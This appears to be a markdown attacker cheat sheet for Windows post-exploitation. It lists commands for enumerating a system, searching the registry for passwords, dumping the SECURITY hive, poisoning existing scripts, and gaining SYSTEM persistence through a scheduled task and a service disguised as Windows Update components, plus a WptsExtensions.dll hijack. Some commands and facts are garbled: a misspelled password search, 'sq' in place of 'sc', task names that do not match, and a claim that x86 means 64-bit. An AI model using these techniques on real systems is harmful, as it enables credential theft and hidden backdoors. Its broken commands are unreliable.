## Table of Contents

  - [Windows System Enumeration](#Windows\System\Enumeration)
          - [Show version information](#Show\version\information)
          - [Display hotfixes and service packs](#Display\hotfixes\and\service\packs)
          - [Display whether 32 or 64-bit system](#Display\whether\32\or\64-bit\system)
          - [Enumerate OS Architecture](#Enumerate\OS\Architecture)
          - [Display OS configuration, including service pack lvls](#Display\OS\configuration,\including\service\pack\lvls)
          - [Display Drive](#Display\Drive)
          - [Display logical drives](#Display\logical\drives)
          - [Set ENV variables](#Set\ENV\variables)
          - [Date of last reboot](#Date\of\last\reboot)
          - [Display shares](#Display\shares)
          - [Display local sessions](#Display\local\sessions)
        - [List users mounter shares](#List\users\mounter\shares)
          - [Search Registry for password](#Search\Registry\for\password)
          - [Save security hive to a file (need sys priv)](#Save\security\hive\to\a\file\(need\sys\priv))
      - [Poisonsing Existing Scripts](#Poisonsing\Existing\Scripts)
    - [System Level Persistence](#System\Level\Persistence)
        - [SCHTASKS on boot](#SCHTASKS\on\boot)
          - [Add Task](#Add\Task)
          - [Query task in verbose mode](#Query\task\in\verbose\mode)
          - [Delete task](#Delete\task)
          - [Run task manually](#Run\task\manually)
          - [Call schtasks to import a task as XML](#Call\schtasks\to\import\a\task\as\XML)
      - [Service Creation](#Service\Creation)
          - [Add service](#Add\service)
          - [Assign description to service (change to blend in)](#Assign\description\to\service\(change\to\blend\in))
          - [Query Service Config](#Query\Service\Config)
      - [Windows 10 .DLL Hijack](#Windows\10\.DLL\Hijack)
          - [List Folders in %PATH%](#List\Folders\in\%PATH%)

## Windows System Enumeration
###### Show version information
```powershell
ver    #enumerate windows version information
```
###### Display hotfixes and service packs
```powershell
wmic wfe list
```
###### Display whether 32 or 64-bit system
`wmic cpu get datawidth /formate:list`
###### Enumerate OS Architecture
	x86 means machine is 64-bit
###### Display OS configuration, including service pack lvls
`systeminfo`
###### Display Drive
`fsutil fsinfo drives`
###### Display logical drives
`wmic logicaldisk get description,name`
###### Set ENV variables
`set`
###### Date of last reboot
`dir /a C:\pagefile.sys
###### Display shares
`net share`
#windows
###### Display local sessions
`net session`
#netsh
##### List users mounter shares
	Must be be run in the context of the user.
`reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\`
#enumeration #registry 
######  Search Registry for password
`reg query HKLM /f passsword /t REG_SZ /s`
###### Save security hive to a file (need sys priv)
`reg save HKLM\Security security.hive`
#### Poisonsing Existing Scripts
Enumerate all user persistence methods above looking for existing persistence that has been created via script files such as `.bat, .ps1 etc.` If they are modifiable by a basic user, modify them to launch a malicious uploaded payload. 
### System Level Persistence
#windows #persistence #systemlevel #backdoor
##### SCHTASKS on boot
	upload binary to system folder and create sheduled task pointing at that binary for execution
###### Add Task
`schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdate /TR <FILE_PATH>`
###### Query task in verbose mode
`schtasks /query /tn OfficeUpdater /fo list /v`
###### Delete task
`schtasks /delete /tn OfficeUpdate /f`
###### Run task manually
`schtasks /run /tn OfficeUpdater`
###### Call schtasks to import a task as XML
`schtasks /create /tn /OfficeUpdata /xml <FILE_PATH>.xml /f`
#### Service Creation
	Uplaod binary to folder and create service pointing at that binary. Can change the service description and display name to blend into the target system.
###### Add service
	Change display-name to a name that blends in with the executable
	
`sc create <SERVCE_NAME> binpath="FILE_PATH" start=auto displayname="Windows Update Proxy Service"`
###### Assign description to service (change to blend in)
`sc description <SERVICE_NAME> "This service ensures Windows Update workds correctly in proxy environments"`

###### Query Service Config
`sq qc <SERVICE_NAME>`
`sq query <SERVICE_NAME>`

#### Windows 10 .DLL Hijack 
	Upload .dll names WptsExtensions.dll
anywhere in system path, reboot machine, and the schedule service will load the malicious WptsExtensions.dll
###### List Folders in %PATH%
`reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment /v PATH`





























































